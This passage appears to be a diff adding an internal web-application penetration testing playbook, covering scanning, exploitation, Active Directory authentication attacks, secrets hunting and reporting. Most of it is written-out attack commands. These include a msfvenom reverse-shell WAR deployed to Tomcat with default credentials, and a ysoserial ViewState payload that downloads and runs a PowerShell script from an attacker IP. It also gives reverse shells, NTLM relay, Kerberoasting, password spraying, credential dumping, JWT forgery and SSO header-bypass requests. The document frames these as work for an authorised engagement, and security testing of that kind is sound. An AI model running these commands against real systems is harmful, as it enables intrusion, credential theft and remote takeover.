+Multi-path internal exposures template: sweep `/.git/HEAD`, `/.env`, `/server-status`, `/api/v2/swagger`, `/actuator/heapdump`, `/actuator/mappings`, `/trace.axd`, `/elmah.axd`, `/phpinfo.php` with a single template. Validate before running with `nuclei -validate -t ./custom-templates/`.
+
+### 4.3 Technology-specific scanners
+
+```bash
+# WordPress
+wpscan --url https://wp.corp.internal --disable-tls-checks --api-token "" --no-update \
+       --random-user-agent -e vp,vt,u,cb,dbe --plugins-detection aggressive
+
+# Drupal / SilverStripe / Joomla
+droopescan scan drupal -u https://internal-drupal.corp --hide-progressbar -t 10
+droopescan scan silverstripe -u https://sscms.corp
+
+# Joomla-specific
+perl joomscan.pl -u https://joomla.corp.internal --enumerate-components
+
+# Nikto — legacy but still finds stuff
+nikto -h https://legacy-app.corp -ssl -nointeractive -Tuning 123bde -o nikto.html
+
+# testssl.sh — TLS/SSL analysis offline
+./testssl.sh --warnings off --fast --quiet --htmlfile tls.html https://app.corp.internal:443
+```
+
+Never use `-Tuning 6` (DoS). Internal CAs will "fail" chain validation — expected.
+
+### 4.4 GraphQL
+
+```bash
+# Fingerprint the engine (Apollo vs Graphene vs Hasura vs HyperGraphQL)
+python3 graphw00f/main.py -d -f -t https://api.corp.internal
+
+# Quick audit — introspection, field suggestions, alias DoS, GET CSRF
+python3 graphql-cop/graphql-cop.py -t https://api.corp.internal/graphql -x \
+        -H "Authorization: Bearer ..." -o report.json -f json
+
+# Schema reconstruction when introspection is OFF
+clairvoyance https://api.corp.internal/graphql \
+             -w /opt/wordlists/google-10000-english.txt -o schema.json \
+             -H "Authorization: Bearer eyJ..." -c 5 -b 64
+
+# InQL in Burp: right-click /graphql request → Send to InQL Scanner
+```
+
+Common paths to fuzz: `/graphql`, `/graphiql`, `/api/graphql`, `/v1/graphql`, `/query`, `/playground`, `/altair`, `/console`. Internal GraphQL APIs rarely disable introspection — run `{__schema{types{name fields{name}}}}` first.
+
+### 4.5 API spec / OpenAPI discovery
+
+Common paths (feed into nuclei/ffuf): `/swagger`, `/swagger-ui.html`, `/swagger/index.html`, `/api-docs`, `/v2/api-docs`, `/v3/api-docs`, `/openapi.json`, `/openapi.yaml`, `/api/swagger.json`, `/docs`, `/redoc`, `/graphql`, `/graphiql`, `/playground`, `/altair`, `/.well-known/openapi`, `/actuator/openapi`.
+
+```bash
+nuclei -l live.txt -t ~/nuclei-templates/ -tags swagger,openapi,api
+```
+
+Once found, import into Burp/Postman for authenticated replay, or build a .kite via `kr kb scan`.
+
+### 4.6 Stack-specific probes
+
+- **ASP.NET/IIS**: `/trace.axd`, `/elmah.axd`, `/elmah.axd/download`, unencrypted `__VIEWSTATE`. Feed ViewState to ysoserial.net; check against leaked MachineKeys with Blacklist3r (`AspDotNetWrapper.exe`) or `viewgen`.
+- **Java/Spring**: `/actuator/env`, `/actuator/heapdump` (= creds in memory), `/actuator/gateway/routes`, `/actuator/threaddump`; `/jolokia/list` → RCE via MBeans; `/h2-console` → RCE via `CREATE ALIAS` JNDI; Struts `/struts2-showcase/` / `*.action`; JBoss `/invoker/JMXInvokerServlet`.
+- **Tomcat**: `/manager/html` with `tomcat:tomcat`, `admin:admin`, `admin:`, `admin:password`, `admin:tomcat`, `manager:manager`, `tomcat:s3cret`, `role1:role1`. Deploy WAR for RCE:
+  ```bash
+  msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.50.5 LPORT=4444 -f war -o shell.war
+  curl -u tomcat:tomcat --upload-file shell.war \
+       "https://tomcat.corp.internal/manager/text/deploy?path=/sh&update=true"
+  ```
+
+---
+
+## Part 5 — Phase 5: Manual testing & exploitation
+
+### 5.1 Burp Suite Community — internal setup
+
+**Corporate CA trust in Burp:** User options → TLS → Imported Certificate Authorities → Add → PEM of corp root. **Burp CA into system/browser trust:** export DER, convert to PEM, `update-ca-certificates`, import into Firefox.
+
+**NTLM to target:** Project options → Sessions → Platform Authentication → Add. Destination `*.corp.internal`, type NTLMv2, username `user` (NOT `CORP\user`), password, domain `CORP`, domain hostname `WKSTN01`.
+
+**Kerberos:**
+```bash
+cat > ~/krb5.conf <<'EOF'
+[libdefaults]
+  default_realm = CORP.INTERNAL
+  forwardable   = true
+  udp_preference_limit = 1
+[realms]
+  CORP.INTERNAL = { kdc = DC01.corp.internal ; admin_server = DC01.corp.internal }
+[domain_realm]
+  .corp.internal = CORP.INTERNAL
+EOF
+kinit user@CORP.INTERNAL
+java -Djava.security.krb5.conf=$HOME/krb5.conf \
+     -Djavax.security.auth.useSubjectCredsOnly=false \
+     -jar burpsuite_community.jar
+```
+Then Project options → HTTP → Platform Authentication → Kerberos for `*.corp.internal`. Alternatively load the **Berserko** BApp which handles TGT inside Burp.
+
+**Session Handling Rule** with a **macro**: for short sessions, per-request CSRF tokens, or rotating bearers. Record login → define extraction (e.g., `csrf_token` from HTML or `XSRF-TOKEN` cookie) → add Session Handling Rule "If out of session match on `Location: /login` → run macro → update current request".
+
+**Match & Replace** for stubborn bearers: Proxy → Options → Regex `^Authorization:.*` → `Authorization: Bearer ${latest}`.
+
+**Community-compatible extensions** (all load as JARs offline): **Autorize**, **Turbo Intruder**, **Param Miner**, **Hackvertor**, **JWT Editor**, **NTLM Challenger**, **SAML Raider**, **Logger++**, **Flow**, **HTTP Request Smuggler**, **Backslash Powered Scanner**, **ActiveScan++**, **Content Type Converter**, **Upload Scanner**, **Freddy** (deserialization detector).
+
+**NTLM Challenger trick:** `curl -I https://app.corp.internal/aspnet_client/` → paste `WWW-Authenticate: NTLM TlRMTVNT...` into the extension → reveals NetBIOS domain, DNS domain, computer name, OS build — free internal recon.
+
+### 5.2 Caido Community, OWASP ZAP, mitmproxy
+
+- **Caido** — Rust, lighter RAM, web UI; HTTPQL filtering (`req.host.cont:"corp" and resp.code:200`); TLS/upstream config via Settings → Proxy/CA. Good for long-running recording and client demos.
+- **ZAP** — fully open-source fallback with active scanner, AJAX spider, Zest/Groovy scripted session handling. `zap.sh -daemon` + `zap-cli` for full automation. Pre-stage add-ons under `~/.ZAP/plugin/`.
+- **mitmproxy** — scriptable Python proxy, GSSAPI/SPNEGO passthrough, HAR/flow export:
+  ```bash
+  mitmproxy --mode regular@8080 --ssl-insecure
+  mitmdump --mode regular@8080 --ssl-insecure -s har_dump.py --set hardump=./session.har
+  KRB5_CONFIG=~/krb5.conf mitmdump --mode upstream:http://proxy.corp.internal:8080 --set upstream_auth=negotiate
+  ```
+
+### 5.3 sqlmap with NTLM
+
+```bash
+sqlmap -r request.txt \
+       --auth-type=NTLM --auth-cred='CORP\user:P@ssw0rd!' \
+       --batch --risk=3 --level=5 --disable-update \
+       --threads=5 --delay=0.2 -p id,search,filter
+
+# Chain through Burp to offload NTLM handling (when python-ntlm chokes on Py3)
+sqlmap -r request.txt --proxy=http://127.0.0.1:8080 --level=5 --risk=3 --batch --disable-update
+
+# OS-level
+sqlmap -r request.txt --os-shell
+sqlmap -r request.txt --os-pwn --msf-path=/opt/msf
+sqlmap -r request.txt --file-read='C:/inetpub/wwwroot/web.config'
+
+# Tampers for fragile/legacy backends
+sqlmap -r request.txt --tamper=between,randomcase,space2comment --level=5 --risk=3
+```
+
+`--disable-update` is mandatory. Pin parameters with `-p` — blasting all at risk=3/level=5 can DoS an Oracle box. Use `--technique=T` (time-based) if the app returns 500s for everything.
+
+### 5.4 Ghauri — sqlmap alternative
+
+```bash
+ghauri -r request.txt --auth-type NTLM --auth-cred 'CORP\user:pass' \
+       --level 3 --batch --threads 1 --force-ssl
+ghauri -r request.txt -p id --current-user --current-db --is-dba
+ghauri -r request.txt --dump -D corpdb -T Users -C username,password,role
+```
+
+Less-noisy than sqlmap; better on blind/second-order; use `--ignore-code 401,403` for endpoints that return errors on unauthed replays.
+
+### 5.5 Dalfox with self-hosted OAST
+
+```bash
+dalfox file urls.txt --skip-bav --custom-payload payloads.txt \
+       -b oast.corp.internal \
+       -C "JSESSIONID=...; XSRF-TOKEN=..." \
+       --proxy http://127.0.0.1:8080 --follow-redirects \
+       --output-format json -o xss.json
+
+dalfox url "https://app.corp/search?q=test" --cookie-from-raw request.txt \
+       -b oast.corp.internal --deep-domxss
+
+# Pipe mode
+cat params.txt | gf xss | dalfox pipe -b oast.corp.internal \
+       -H "Authorization: Bearer eyJ..." --skip-bav
+```
+
+Blind payloads fire to `oast.corp.internal/xss/...` — ensure interactsh is up **before** scanning.
+
+### 5.6 Autorize — authorization / IDOR testing
+
+Two sessions (high-priv admin cookie in proxied browser + low-priv cookie in Autorize config). Browse as admin → Autorize replays each request with low-priv and with no-cookie → diffs responses. Results:
+
+- 🟢 **Bypassed** — low-priv got same response as admin = broken AuthZ finding.
+- 🟡 **Is enforced???** — manually verify.
+- 🔴 **Enforced** — correctly rejected.
+
+Tune noise with an enforcement detector (unique "access denied" page fingerprint). Combine with a Session Handling Rule macro for per-request CSRF-rotating apps.
+
+### 5.7 Turbo Intruder — race conditions
+
+HTTP/2 single-packet attack skeleton:
+```python
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1,
+                           engine=Engine.BURP2)
+    for _ in range(3): engine.queue(target.req)        # warm
+    for i in range(30): engine.queue(target.req, gate='race1')
+    engine.openGate('race1')
+
+def handleResponse(req, interesting): table.add(req)
+```
+
+Multi-endpoint race (coupon + checkout): queue `applyCoupon` + 20× `checkout` on the same gate. Target must support HTTP/2; for HTTP/1.1 internal apps use `Engine.THREADED` with last-byte sync.
+
+### 5.8 Param Miner — hidden params, headers, cache poisoning
+
+Right-click → Param Miner → **Guess headers** / **Guess params** / **Guess cookies** / **Guess JSON params**. Finds `X-Forwarded-For`, `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-Host`, debug/impersonate headers. Cache poisoning: look for `X-Cache:`/`Age:` in responses, append cache-buster `?cb=RAND` when testing prod. Old internal Squid caches are fragile — lower thread count.
+
+### 5.9 ysoserial / ysoserial.net — deserialization
+
+**Java:**
+```bash
+java -jar ysoserial-all.jar CommonsCollections5 'nslookup test.oast.corp.internal' > cc5.bin
+java -jar ysoserial-all.jar URLDNS 'http://test.oast.corp.internal' > urldns.bin    # detection first
+```
+
+**.NET ViewState with known MachineKey** (leaked via web.config / LFI / actuator/heapdump):
+```
+ysoserial.exe -p ViewState -g TypeConfuseDelegate \
+  -c "powershell -c iwr http://10.10.50.5/r.ps1|iex" \
+  --path="/default.aspx" --apppath="/" \
+  --decryptionalg="AES" --decryptionkey="..." \
+  --validationalg="SHA1" --validationkey="..." --islegacy --isencrypted
+```
+
+Discovery sinks in Burp: Base64 blobs in `__VIEWSTATE`/cookies, `Content-Type: application/x-java-serialized-object`, AMF (`application/x-amf`), RMI/T3/IIOP on high ports, Kryo/fastjson/Jackson `enableDefaultTyping`. Use the **Freddy** extension for passive detection + interactsh OOB confirmation. Start with `URLDNS` / `ObjectDataProvider` to confirm deserialization *happens* before escalating.
+
+### 5.10 commix, SSTImap
+
+```bash
+# commix — OS command injection
+commix -r request.txt --batch --level=3
+commix -u "https://app.corp/ping?ip=127.0.0.1" --technique=T --tamper=space2ifs --batch
+commix -r request.txt --dns-server=oast.corp.internal     # OOB exfil
+commix -r request.txt --icmp-exfil="ip_src=10.10.50.5,ip_dst=TARGET"
+
+# SSTI — SSTImap (Python 3 fork of tplmap)
+python3 sstimap.py -u 'https://app.corp/greet?name=John*' -s
+python3 sstimap.py -u 'https://app.corp/greet?name=John*' --os-shell
+python3 sstimap.py -u 'https://app.corp/x?p=*' --reverse-shell 10.10.50.5 4444
+```
+
+Engine fingerprint quick-test: `{{7*7}}` → 49 (Jinja/Twig), `${7*7}` → 49 (Freemarker/Mako/ERB), `{7*7}` → 49 (Smarty). Polyglot `${{<%[%'"}}%\.` errors out usefully on most engines.
+
+---
+
+## Part 6 — Phase 6: Authentication-specific testing
+
+Internal apps heavily use Windows auth. This phase is where the internal pentest diverges most radically from public bug bounty.
+
+### 6.1 Impacket suite
+
+```bash
+pipx install impacket    # or offline wheels via pip download
+```
+
+**ntlmrelayx** — the single most powerful internal web-app primitive:
+```bash
+# Relay to a web app without EPA (OWA, SharePoint, legacy IIS with WindowsAuth)
+impacket-ntlmrelayx -t https://mail.corp.local/owa -smb2support --no-http-server
+
+# Relay to LDAPS for RBCD (grant attacker constrained delegation over a victim)
+impacket-ntlmrelayx -t ldaps://dc01.corp.local --delegate-access --escalate-user CORP\\lowpriv -smb2support
+
+# Relay to LDAPS for Shadow Credentials
+impacket-ntlmrelayx -t ldaps://dc01.corp.local --shadow-credentials --shadow-target 'WEB01$' -smb2support
+
+# SOCKS keeps relayed sessions alive for proxychains
+impacket-ntlmrelayx -tf smb-no-signing.txt -socks -smb2support
+proxychains impacket-secretsdump CORP/lowpriv@10.10.20.12 -no-pass
+```
+
+Disable Responder's HTTP+SMB servers (`Responder.conf`: `HTTP=Off, SMB=Off`) before relaying. Verify relayability beforehand: `nxc smb --gen-relay-list smb-no-signing.txt` and `nxc ldap -M ldap-checker`. `--remove-mic` may be needed vs unpatched DCs.
+
+**Kerberoasting** (finds service accounts with HTTP SPNs = web-app service accounts):
+```bash
+impacket-GetUserSPNs CORP.LOCAL/lowpriv:'Winter2026!' -dc-ip 10.10.10.10 -request -outputfile roast.hashes
+hashcat -m 13100 roast.hashes /usr/share/wordlists/rockyou.txt -r OneRuleToRuleThemAll.rule
+```
+
+**AS-REP roasting** (no creds needed):
+```bash
+impacket-GetNPUsers CORP.LOCAL/ -dc-ip 10.10.10.10 -usersfile users.txt \
+    -format hashcat -outputfile asrep.hashes -no-pass
+hashcat -m 18200 asrep.hashes wordlist
+```
+
+**findDelegation** — look for web service accounts with unconstrained delegation or constrained delegation with protocol transition to `HTTP/...`:
+```bash
+impacket-findDelegation CORP.LOCAL/lowpriv:'...' -dc-ip 10.10.10.10
+```
+
+### 6.2 Responder
+
+```bash
+sudo responder -I eth0 -A                                  # analyze (passive) — RUN FIRST
+sudo responder -I eth0 -wF                                 # full capture
+sudo responder -I eth0 --lm --disable-ess                  # force NTLMv1 downgrade
+```
+
+Pairs with ntlmrelayx: flip `HTTP=Off, SMB=Off` in Responder.conf and run both in parallel — victims mistype `http://intranet` or `http://jira` → broadcast name lookup → victim authenticates to you with Negotiate → relay into the real internal web app.
+
+### 6.3 Kerbrute
+
+```bash
+./kerbrute userenum --dc 10.10.10.10 -d corp.local xato-net-10-million-usernames.txt -o users.valid
+./kerbrute passwordspray --dc 10.10.10.10 -d corp.local users.valid 'Winter2026!'
+./kerbrute passwordspray --dc 10.10.10.10 -d corp.local users.valid 'Summer2025!' --delay 500 --threads 1
+./kerbrute bruteuser --dc 10.10.10.10 -d corp.local passwords.txt svc_webapp
+```
+
+Kerbrute **does** generate 4768 events on the DC; pre-auth errors may not increment lockout on some DCs but are logged. Always `nxc smb dc01 --pass-pol` first.
+
+### 6.4 NetExec for web auth validation
+
+`nxc` doesn't have a first-class `http` module yet, but validating a credential with `nxc smb`/`nxc ldap` and then reusing it on the web app covers 90% of cases (internal web apps re-use AD creds). Password spraying strategy: one password × many users, `--continue-on-success --jitter 1 5`, never reverse.
+
+### 6.5 Handling Kerberos/SPNEGO in proxies
+
+Three working patterns:
+1. **Firefox** with `network.negotiate-auth.trusted-uris = .corp.local` → proxy to Burp. Kinit-based ccache just works.
+2. **Burp with Java Kerberos** — see 5.1 above.
+3. **Sidecar terminator** — cntlm/px/krb5-auth-proxy terminates NTLM/Kerberos and forwards plaintext to Burp.
+
+SPN **must** match the hostname the browser asked for (`HTTP/app.corp.local` — not IP, not CNAME source). Check with `impacket-GetUserSPNs | grep HTTP`.
+
+### 6.6 SAML Raider
+
+Internal ADFS is an ubiquitous target. Intercept SAMLRequest or SAMLResponse → SAML Raider Certificates tab → import cert → edit `<saml:NameID>` to `administrator@corp.local` → run **XSW #1..#8** (signature wrapping) → try all variants, not just #1 — ADFS signs both Response and inner Assertion; XSW variants that keep both signatures valid work on more implementations.
+
+### 6.7 jwt_tool
+
+```bash
+python3 jwt_tool.py -t https://app.corp.local/api/me \
+    -rh "Authorization: Bearer eyJ..." -M pb          # full playbook
+
+python3 jwt_tool.py eyJ... -X a                        # alg:none
+python3 jwt_tool.py eyJ... -X k -pk pubkey.pem         # HS/RS key confusion
+python3 jwt_tool.py eyJ... -X i -I -pc sub -pv administrator    # inline JWK inject
+python3 jwt_tool.py eyJ... -I -hc kid -hv "../../../../dev/null" -S hs256 -p ""
+python3 jwt_tool.py eyJ... -C -d /usr/share/wordlists/rockyou.txt               # crack HS256
+```
+
+`-X s` (JWKS spoof) requires target to reach your HTTP server — set `jwksloc = http://10.10.99.5:8000/jwks.json` in `jwtconf.ini` and `python3 -m http.server 8000`.
+
+### 6.8 OAuth/OIDC — manual checks
+
+```bash
+curl -sk https://sso.corp.local/.well-known/openid-configuration | jq
+curl -sk https://sso.corp.local/adfs/.well-known/openid-configuration | jq
+
+# redirect_uri path confusion
+curl -i "https://sso.corp.local/oauth2/authorize?client_id=webapp&response_type=code&redirect_uri=https://app.corp.local.attacker.corp.local/cb"
+
+# Missing state (CSRF on callback)
+curl -i "https://sso.corp.local/oauth2/authorize?client_id=webapp&response_type=code&redirect_uri=https://app.corp.local/cb"
+
+# response_type mix-up
+curl -i "https://sso.corp.local/oauth2/authorize?client_id=webapp&response_type=token&redirect_uri=https://app.corp.local/cb"
+
+# PKCE downgrade — exchange auth code without code_verifier
+curl -k -X POST https://sso.corp.local/oauth2/token \
+     -d 'grant_type=authorization_code&code=<CODE>&redirect_uri=https://app.corp.local/cb&client_id=webapp'
+```
+
+### 6.9 SSO-bypass reverse-proxy header smuggling
+
+Reverse proxies/ingress controllers that terminate SSO and inject trusted headers often forward those headers when the client already supplied them — auth bypass.
+
+```bash
+curl -sk https://app.corp.local/admin -H 'X-Remote-User: administrator'
+curl -sk https://app.corp.local/admin -H 'X-Forwarded-User: CORP\administrator'
+curl -sk https://app.corp.local/admin -H 'X-Auth-Request-User: administrator' \
+                                      -H 'X-Auth-Request-Email: administrator@corp.local'
+
+# Path-confusion bypasses
+curl -sk 'https://app.corp.local/;/admin'
+curl -sk 'https://app.corp.local/%2f/admin'
+
+# IIS+ARR / older Spring / Symfony
+curl -sk https://app.corp.local/anonymous -H 'X-Original-URL: /admin'
+curl -sk https://app.corp.local/anonymous -H 'X-Rewrite-URL:  /admin'
+
+# OAuth2-proxy X-Forwarded-Uri (GHSA 2024)
+curl -sk 'https://app.corp.local/oauth2/auth' -H 'X-Forwarded-Uri: /admin'
+
+# Bypass proxy entirely — direct to backend
+curl -sk --resolve app.corp.local:443:10.10.20.42 https://app.corp.local/admin
+```
+
+Full header list: `X-Remote-User, X-Forwarded-User, X-Auth-Request-User, X-Auth-Request-Email, X-WebAuth-User, X-User, X-Authenticated-User, X-SSL-Client-S-DN, Remote-User, REMOTE_USER, X-Original-URL, X-Rewrite-URL, X-Forwarded-For, X-Forwarded-Host, X-Forwarded-Uri, X-Forwarded-Proto, X-Forwarded-Preferred-Username`. Try casing and underscore variants — header that "wins" depends on proxy concat order.
+
+### 6.10 BloodHound collection (offline ingest)
+
+```bash
+bloodhound-python -c All -u lowpriv -p 'Winter2026!' -d corp.local -ns 10.10.10.10 --zip
+```
+
+Feed zip to offline neo4j + BloodHound GUI. Pre-built Cypher: *"Kerberoastable users with path to DA"*, *"Unconstrained delegation computers"*, *"Users that can RDP to web server"*.
+
+---
+
+## Part 7 — Phase 7: Secrets & source code analysis
+
+### 7.1 TruffleHog v3
+
+```bash
+# Self-hosted GitLab / GHE / Bitbucket Server / Azure DevOps Server
+trufflehog gitlab --endpoint https://gitlab.corp.local --token $GITLAB_PAT --no-verification -j > tru_gitlab.json
+trufflehog github --endpoint https://ghe.corp.local --token $GHE_PAT --org ENG --no-verification
+trufflehog bitbucket --endpoint https://bitbucket.corp.local --token $BB_PAT --no-verification
+
+# Pre-cloned repos
+trufflehog git file:///mnt/clones/corp-monorepo --no-verification -j > tru_repo.json
+
+# Filesystem (shared drives, dev boxes, mirrored JS)
+trufflehog filesystem --directory /mnt/shares/Departments --no-verification -j > tru_fs.json
+
+# Docker images from internal registry
+trufflehog docker --image registry.corp.local/app:latest --no-verification
+```
+
+Use `--no-verification` (not `--only-verified`) — `--only-verified` hits external APIs (AWS/GitHub/etc.) that silently fail offline and drop all detectors.
+
+### 7.2 Gitleaks, noseyparker, ripgrep
+
+```bash
+# gitleaks — pre-cloned mirrors
+gitleaks detect --source /mnt/clones/repo --no-git -v --report-format json --report-path gl.json
+gitleaks detect --source /mnt/clones/ --config ./corp-rules.toml -v
+
+# noseyparker — fast multi-repo/FS
+noseyparker scan --datastore np.ds /mnt/clones /mnt/shares
+noseyparker report --datastore np.ds --format jsonl > np.jsonl
+
+# ripgrep — dumb but effective on source trees, container filesystem exports, decompiled JARs
+rg -uu -n --hidden --no-ignore \
+  -e 'AKIA[0-9A-Z]{16}' -e 'AIza[0-9A-Za-z\-_]{35}' \
+  -e 'gh[pousr]_[A-Za-z0-9]{36,}' -e 'glpat-[A-Za-z0-9_\-]{20,}' \
+  -e 'xox[baprs]-[A-Za-z0-9\-]{10,}' \
+  -e '-----BEGIN (RSA |EC |OPENSSH |)PRIVATE KEY-----' \
+  -e 'eyJ[A-Za-z0-9_\-]{10,}\.' \
+  -e 'mongodb(\+srv)?://[^\s"'"'"']+' \
+  -e '(api[_-]?key|secret|token|passwd|password)\s*[:=]\s*[\"'"'"'][^\"'"'"']{8,}' \
+  /path/to/source
+```
+
+Custom corp-specific Gitleaks rule:
+```toml
+[[rules]]
+id = "corp-okta-api"
+description = "Internal Okta API token"
+regex = '''00[a-zA-Z0-9_-]{40}'''
+tags = ["okta","corp"]
+```
+
+### 7.3 SMB share secret hunting
+
+Internal file shares contain GPP `cpassword`, `web.config` with DB creds, `unattend.xml`, saved KeePass files, `.rdp` files with stored creds, private keys on devs' home shares.
+
+```bash
+nxc smb 10.10.20.0/24 -u CORP\\lowpriv -p 'Winter2026!' --shares
+nxc smb 10.10.20.0/24 -u CORP\\lowpriv -p 'Winter2026!' -M spider_plus \
+    -o READ_ONLY=false EXCLUDE_DIRS=print$,ipc$,C$ DOWNLOAD_FLAG=true OUTPUT_FOLDER=loot/shares \
+    PATTERN='.config,.xml,.yml,.yaml,.json,.ini,.bak,.old,.sql,.ps1,.sh,.env,.pem,.ppk'
+
+nxc smb dc01.corp.local -u CORP\\lowpriv -p 'Winter2026!' -M gpp_password -M gpp_autologin
+
+# Browser / WinSCP / PuTTY / DPAPI creds from accessible workstations (if you have admin)
+nxc smb 10.10.20.0/24 -u admin -p 'Pass!' -M winscp -M putty -M firefox
+nxc smb 10.10.20.0/24 -u admin -p 'Pass!' --dpapi
+```
+
+### 7.4 Snallygaster, exposed config paths
+
+```bash
+pipx install snallygaster
+snallygaster -n app.corp.local
+snallygaster --nohttp2 --nowww -i --useragent 'Mozilla/5.0 AppSec' hosts.txt
+```
+
+Common exposed paths (add to ffuf wordlist): `.env .env.bak .env.local .env.prod config.php web.config appsettings.json application.properties application.yml wp-config.php .git/config .git/HEAD .svn/entries Dockerfile docker-compose.yml kustomization.yaml .gitlab-ci.yml Jenkinsfile backup.zip db.sql dump.sql id_rsa authorized_keys sftp-config.json deploy.php .DS_Store`.
+
+If `/.git/` is exposed: use `git-dumper` (local Python) to reconstruct the repo, then TruffleHog it.
+
+### 7.5 JS harvesting pipeline (review)
+
+Already covered in §3.6 — but the full offline chain for secrets: katana crawl → `grep .js` → `wget --mirror` → `jsluice secrets` + `SecretFinder` + `trufflehog filesystem` + `ripgrep`. Belt-and-braces coverage catches string-concat secrets that any single tool misses.
+
+---
+
+## Part 8 — Phase 8: Reporting & evidence
+
+### 8.1 Notes
+
+- **Obsidian** — local-first markdown, graph, plugins (Excalidraw, Kanban, Templater, Dataview). Pre-stage AppImage + plugins under `.obsidian/plugins/`. Folder-per-engagement:
+  ```
+  <client>/vault/
+    00-intro.md  10-recon/  20-findings/  30-evidence/  40-creds/  50-report/  Templates/
+  ```
+  Finding template: severity, CVSS v3.1, affected URL, summary, impact, evidence (screenshots), PoC request, root cause, remediation, references.
+- **Joplin** — alternative, local-first, optional E2E encrypted sync via local Nextcloud/WebDAV.
+- **CherryTree** — hierarchical notebook (`.ctb` sqlite), long-time pentester favorite for debrief walkthroughs.
+- **KeePassXC** — keep all creds in an encrypted DB, never plaintext in vault files.
+
+### 8.2 Screenshots & recordings
+
+```bash
+# Flameshot with annotations + save to evidence dir
+flameshot gui -d 3000 -p ~/engagement/30-evidence/
+flameshot full -p ~/engagement/30-evidence/ -c          # also copies to clipboard
+
+# Terminal session recording
+asciinema rec evidence/poc-relay.cast -t "OWA NTLM relay" --idle-time-limit 2
+agg evidence/poc-relay.cast evidence/poc-relay.gif      # animated gif for report
+```
+
+**Always blur tokens, cookies, NT hashes, usernames not required for PoC** — evidence travels further than you think.
+
+### 8.3 HAR / pcap evidence
+
+```bash
+# mitmproxy HAR
+mitmdump -w flows.mitm --mode transparent --ssl-insecure
+mitmdump -nr flows.mitm --set hardump=session.har
+
+# Wireshark / tshark — critical for auth findings
+sudo tshark -i eth0 -w evidence/ntlm-relay.pcapng -f 'host 10.10.20.42 or host 10.10.10.10'
+tshark -r evidence/ntlm-relay.pcapng -Y 'ntlmssp' -T fields \
+       -e ntlmssp.auth.username -e ntlmssp.auth.domain -e ntlmssp.auth.hostname
+tshark -r evidence/kerb.pcapng -Y 'kerberos.CNameString' -T fields \
+       -e kerberos.CNameString -e kerberos.etype      # RC4=23 is weak
+```
+
+### 8.4 Report generation
+
+```bash
+# Markdown → DOCX with corp reference style
+pandoc draft.md --reference-doc=templates/corp-reference.docx --toc --number-sections -o Report.docx
+
+# Markdown → PDF (requires offline LaTeX: texlive-latex-recommended)
+pandoc draft.md -o Report.pdf --template=templates/eisvogel.latex \
+       --pdf-engine=xelatex --highlight-style=breezedark --toc --number-sections
+
+# Combine all finding files
+pandoc 00-*.md 20-findings/*.md 50-report/*.md -o Final.docx
+```
+
+**Dradis Community Edition** (dockerized, air-gap-friendly) aggregates nmap, nuclei, burp, nikto + manual notes into a structured report. Severity rubric: CVSS v3.1 base + environmental, plus a *"Likelihood in this environment"* column — executives care about exploit path, not raw CVSS.
+
+---
+
+## Part 9 — Top 10 actionable commands for Day 1
+
+One-time setup:
+```bash
+export ENG=~/engagements/$(date +%F)-internal-webapp
+mkdir -p $ENG/{recon,web,creds,loot,evidence} && cd $ENG
+export TARGET_CIDR=10.10.20.0/24
+export DC_IP=10.10.10.10
+export DOMAIN=corp.local
+export ATTACKER_IP=10.10.99.5
+export RESOLVER=$DC_IP
+```
+
+**1. Mass host/port discovery:**
+```bash
+sudo masscan $TARGET_CIDR -p0-65535 --rate 5000 -oG recon/masscan.gnmap
+awk '/Host:/ {print $2}' recon/masscan.gnmap | sort -u > recon/live.hosts
+sudo nmap -sS -sV -sC --version-intensity 5 -Pn -T4 -iL recon/live.hosts \
+  -p 21,22,25,53,80,88,110,135,139,143,389,443,445,464,500,514,587,593,636,993,995,1433,1521,2049,3268,3269,3306,3389,5000,5432,5601,5900,5985,5986,6379,7001,7002,8000,8008,8009,8080,8081,8088,8089,8090,8161,8443,8500,8834,8888,9000,9001,9090,9091,9092,9100,9200,9300,9418,9443,10000,11211,15672,27017,50070 \
+  -oA recon/nmap-full
+```
+
+**2. Fast web service probe:**
+```bash
+httpx -l recon/live.hosts -silent -status-code -title -tech-detect -tls-grab \
+      -favicon -web-server -follow-redirects \
+      -ports 80,443,8080,8443,8000,8888,9000,9090,3000,5000,5601,7001,8081,8180,9443 \
+      -H 'User-Agent: Mozilla/5.0 AppSec' \
+      -threads 100 -timeout 8 -duc -o web/httpx.out -json -o web/httpx.json
+awk '{print $1}' web/httpx.out | sort -u > web/urls.live
+```
+
+**3. Screenshot sweep:**
+```bash
+gowitness scan file -f web/urls.live --screenshot-path web/shots \
+  --timeout 20 --resolution-x 1440 --resolution-y 900 --write-db \
+  --chrome-path /usr/bin/chromium
+gowitness report serve --address 127.0.0.1:7171 &
+```
+
+**4. Internal DNS brute:**
+```bash
+echo $RESOLVER > recon/resolvers.txt
+puredns bruteforce /opt/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \
+  $DOMAIN -r recon/resolvers.txt --resolvers-trusted recon/resolvers.txt \
+  --skip-validation --rate-limit 500 --write recon/subs.$DOMAIN.txt
+```
+
+**5. Nuclei baseline with self-hosted OAST:**
+```bash
+nuclei -l web/urls.live -ud /opt/tools/nuclei-templates -disable-update-check \
+  -severity low,medium,high,critical \
+  -tags cve,exposure,config,default-login,takeover,tech,misconfiguration \
+  -exclude-tags dos,fuzz,intrusive \
+  -iserver https://oast.corp.internal -itoken $INTERACT_TOKEN \
+  -rate-limit 50 -concurrency 25 -retries 1 \
+  -o web/nuclei.out -j -je web/nuclei.json
+```
+
+**6. Content discovery on a target app:**
+```bash
+TARGET_APP=app.corp.local
+ffuf -u "https://$TARGET_APP/FUZZ" \
+  -w /opt/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt \
+  -mc 200,204,301,302,307,401,403,405 -fc 404 -ac -recursion -recursion-depth 2 \
+  -t 40 -timeout 10 -k -of json -o web/ffuf.$TARGET_APP.json
+```
+
+**7. JS harvest + jsluice:**
+```bash
+katana -u https://$TARGET_APP -d 3 -jc -silent -duc | grep -Ei '\.js(\?|$)' | sort -u > web/js.urls
+mkdir -p web/js && wget -q --no-check-certificate -i web/js.urls -P web/js/ -nc
+find web/js -type f -name '*.js' -exec jsluice urls    {} \; | sort -u > web/js.endpoints
+find web/js -type f -name '*.js' -exec jsluice secrets {} \; | tee web/js.secrets
+trufflehog filesystem --directory web/js --no-verification -j > web/js.trufflehog.json
+```
+
